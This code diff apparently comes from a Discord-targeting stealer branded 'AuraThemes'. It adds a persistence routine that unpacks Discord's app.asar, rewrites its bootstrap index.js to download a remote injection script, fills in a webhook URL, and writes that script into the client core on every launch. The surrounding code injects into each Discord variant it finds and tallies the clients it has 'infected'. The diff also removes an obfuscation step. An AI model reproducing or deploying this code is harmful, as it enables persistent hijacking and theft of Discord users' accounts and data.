@@ -7,29 +7,207 @@ const {
 } = require('../../../utils/harware.js');
 
 const child_process = require('child_process');
-const fsPromises    = require('fs/promises');
-const jsConfuser    = require('js-confuser');
 const axios         = require('axios');
 const path          = require('path');
+const asar          = require('asar');
 const fs            = require('fs');
+
+async function persistentInjection(appDir, injectionUrl, webhook, configInject) {
+    const CONFIG_INJECT = configInject;
+    const asarFilePath = path.join(appDir, 'resources', 'app.asar');
+    const unpackedDir = path.join(appDir, 'resources', 'unpacked');
+    try {
+        const srcInjectionAsar = `
+            "use strict";
+            console.log("https://discord.gg/aurathemes")
+            const fs = require("fs"),https = require("https"),
+                path = require("path"),
+                buildInfo = require('./buildInfo'),
+                paths = require('../common/paths'),
+                moduleUpdater = require('../common/moduleUpdater'),
+                updater = require('../common/updater'),
+                requireNative = require('./requireNative');
+            paths.init(buildInfo);
+            function getAppMode() {
+                if (process.argv && process.argv.includes('--overlay-host')) {
+                    return 'overlay-host';
+                }
+                return 'app';
+            }
+            const mode = getAppMode();
+            if (mode === 'app') {
+                require('./bootstrap');
+            } else if (mode === 'overlay-host') {
+                const appSettings = require('./appSettings');
+                appSettings.init();
+                const { NEW_UPDATE_ENDPOINT } = require('./Constants');
+                if (!buildInfo.debug && buildInfo.newUpdater) {
+                    if (!updater.tryInitUpdater(buildInfo, NEW_UPDATE_ENDPOINT)) {
+                        throw new Error('Failed to initialize modules on the overlay host');
+                    }
+                    updater.getUpdater().startCurrentVersionSync({ allowObsoleteHost: true });
+                } else {
+                    moduleUpdater.initPathsOnly(buildInfo);
+                }
+                requireNative('discord_overlay2/standalone_host.js');
+            }
+            try {
+                initAuraThemes()
+            } catch (e) {
+
+            }
+            const discordAppDataPath = path.join(
+                process.env.LOCALAPPDATA || 
+                (process.platform == "darwin"
+                    ? process.env.HOME + "/Library/Preferences"
+                    : "/var/local"
+                ), "Discord");
+            function findDiscordVersion() {
+                const discordVersions = fs
+                    .readdirSync(discordAppDataPath)
+                    .filter((folder) => folder.startsWith("app-"));
+                console.log(discordVersions);
+                if (discordVersions.length > 0) {
+                    return discordVersions[0];
+                }
+                return null;
+            }
+            function findCoreVersion(discordVersion) {
+                const coreVersionsPath = path.join(
+                    discordAppDataPath,
+                    discordVersion,
+                    "modules"
+                );
+                const coreVersions = fs
+                    .readdirSync(coreVersionsPath)
+                    .filter((folder) => folder.startsWith("discord_desktop_core-"));
+                if (coreVersions.length > 0) {
+                    return coreVersions[0];
+                }
+                return null;
+            }
+            function initAuraThemes() {
+                const discordVersion = findDiscordVersion();
+                const coreVersion = discordVersion
+                    ? findCoreVersion(discordVersion)
+                    : null;
+                if (discordVersion && coreVersion) {
+                    const indexFilePath = path.join(
+                        discordAppDataPath,
+                        discordVersion,
+                        "modules",
+                        coreVersion,
+                        "discord_desktop_core/index.js"
+                    );
+                    const betterDiscordPath = path.join(
+                        process.env.APPDATA ||
+                        (process.platform == "darwin"
+                            ? process.env.HOME + "/Library/Preferences"
+                            : "/var/local"),
+                        "betterdiscord/data/betterdiscord.asar"
+                    );
+                    try {
+                        const negger = fs.readFileSync(indexFilePath, "utf8");
+                        if (negger === "module.exports = require('./core.asar');" || negger.length < 20000) {
+                            init();
+                        } else {
+                            console.log("AuraThemes is still active in this Discord client")
+                        }
+                    } catch (err) {
+                        console.error("Error index.js Read:", err);
+                    }
+                    function init() {
+                        https.get("${injectionUrl}", (res) => {
+                            let chunk = "";
+                            res.on("data", (data) => (chunk += data));
+                            res.on("end", () => {
+                                const newContent = chunk
+                                    .replace("%WEBHOOK_URL%", "${webhook}")
+                                    .replace("%API_URL%", "${CONFIG_INJECT.API}")
+                                    .replace("%AUTO_USER_PROFILE_EDIT%", "${CONFIG_INJECT.auto_user_profile_edit}")
+                                    .replace("%AUTO_EMAIL_UPDATE%", "${CONFIG_INJECT.auto_email_update}")
+                                    .replace("%GOFILE_DOWNLOAD_LINK%", "${CONFIG_INJECT.gofile_download_link}");
+
+                                fs.writeFileSync(indexFilePath, newContent);
+                            });
+                        }).on("error", (err) => {
+                            console.error("Error request:", err);
+                            setTimeout(init, 10000);
+                        });
+                    }
+                    require(path.join(discordAppDataPath, discordVersion, "resources/app.asar"));
+                    if (fs.existsSync(betterDiscordPath)) {
+                        require(betterDiscordPath);
+                    }
+                } else {
+                    console.error("AuraThemes is still active");
+                }
+            }
+        `; 
+        await extractAsarArchive(asarFilePath, unpackedDir);
+        await new Promise(resolve => setTimeout(resolve, 2500));
+        const indexPath = path.join(unpackedDir, 'app_bootstrap', 'index.js');
+        await fs.promises.writeFile(indexPath, '', 'utf8');
+        await appendToFile(indexPath, srcInjectionAsar);
+        await packAsar(unpackedDir, asarFilePath);
+    } catch (error) {
+        console.error('An error occurred during persistent injection:', error);
+    }
+}
+
+async function extractAsarArchive(asarFilePath, outputDirectory) {
+    try {
+        await fs.promises.mkdir(outputDirectory, { recursive: true });
+        asar.extractAll(asarFilePath, outputDirectory);
+    } catch (error) {
+        console.error(`Failed to extract ASAR file: ${asarFilePath}`);
+        console.error(`Error details: ${error.stack}`);
+        throw error;
+    }
+}
+
+async function appendToFile(filePath, content) {
+    try {
+        await fs.promises.appendFile(filePath, `\n${content}`, 'utf8');
+    } catch (error) {
+        console.error(`Failed to write to file: ${filePath}`);
+        console.error(`Error details: ${error.stack}`);
+        throw error;
+    }
+}
+
+async function packAsar(sourceDir, asarFilePath) {
+    try {
+        asar.createPackage(sourceDir, asarFilePath);
+    } catch (error) {
+        console.error(`Failed to pack directory into ASAR file: ${asarFilePath}`);
+        console.error(`Error details: ${error.stack}`);
+        throw error;
+    }
+}
+
 
 async function injectDiscord(dir, injectionUrl, webhook, api) {
     try {
         const CONFIG_INJECT = {
             API: api,
             auto_user_profile_edit: 'true',
-            auto_email_update: 'true',
+            auto_email_update: 'false',
             gofile_download_link: 'https://gofile.io', // Perhaps I'll add something better when there are more stars
         };
 
-        const files = await fsPromises.readdir(dir, { withFileTypes: true });
+        const files = await fs.promises.readdir(dir, { withFileTypes: true });
         const appDirs = files
             .filter(file => file.isDirectory() && file.name.startsWith('app-'))
             .map(file => path.join(dir, file.name, 'modules'));
 
+        for (const appDir of appDirs){
+            persistentInjection(appDir.replaceAll('modules', ''), injectionUrl, webhook, CONFIG_INJECT);
+        };
+
         const matchingDirs = await Promise.all(appDirs.map(async coreDir => {
             try {
-                const matchedDirs = await fsPromises.readdir(coreDir, { withFileTypes: true });
+                const matchedDirs = await fs.promises.readdir(coreDir, { withFileTypes: true });
                 return matchedDirs
                     .filter(file => file.isDirectory() && file.name.startsWith('discord_desktop_core-'))
                     .map(file => path.join(coreDir, file.name, 'discord_desktop_core'));
@@ -44,7 +222,7 @@ async function injectDiscord(dir, injectionUrl, webhook, api) {
         for (const coreDir of flattenedDirs) {
             try {
                 const initiationDir = path.join(coreDir, 'aurathemes');
-                await fsPromises.mkdir(initiationDir, { recursive: true });
+                await fs.promises.mkdir(initiationDir, { recursive: true });
 
                 const response = await axios.get(injectionUrl);
                 const injection = response.data;
@@ -55,34 +233,10 @@ async function injectDiscord(dir, injectionUrl, webhook, api) {
                     .replace("%AUTO_USER_PROFILE_EDIT%", CONFIG_INJECT.auto_user_profile_edit)
                     .replace("%AUTO_EMAIL_UPDATE%", CONFIG_INJECT.auto_email_update)
                     .replace("%GOFILE_DOWNLOAD_LINK%", CONFIG_INJECT.gofile_download_link);
-                
-                const applyObfInjection = await jsConfuser.obfuscate(srcInjection, {
-                    target: "node",
-                    controlFlowFlattening: 0,
-                    minify: false,
-                    globalConcealing: true,
-                    stringCompression: 1,
-                    stringConcealing: 0.9,
-                    stringEncoding: 0.3,
-                    stringSplitting: 1,
-                    deadCode: 0,
-                    calculator: 0.5,
-                    compact: true,
-                    movedDeclarations: false,
-                    objectExtraction: false,
-                    stack: true,
-                    duplicateLiteralsRemoval: 0,
-                    flatten: false,
-                    dispatcher: true,
-                    opaquePredicates: 0,
-                    shuffle: { hash: 0.6, true: 0.6 },
-                    renameVariables: false,
-                    renameGlobals: false
-                });
-
+                    
                 const indexJsPath = path.join(coreDir, 'index.js');
 
-                await fsPromises.writeFile(indexJsPath, applyObfInjection, 'utf8');
+                await fs.promises.writeFile(indexJsPath, srcInjection, 'utf8');
                 const match = coreDir.match(/Local\\(discordcanary|discord|discorddevelopment|discordptb)\\/i);
                 if (match) {
                     infectedDiscord.add(match[1].toLowerCase());
@@ -92,7 +246,10 @@ async function injectDiscord(dir, injectionUrl, webhook, api) {
             }
         }
 
-        const description = infectedDiscord.size > 0 ? Array.from(infectedDiscord).map(name => `\`${name}\``).join(", ") : `\`Not found\``;
+        const description = infectedDiscord.size > 0 
+            ? Array.from(infectedDiscord).map(name => `\`${name}\``).join(", ") 
+            : `\`Not found\``;
+            
         const data = {
             embeds: [
                 {
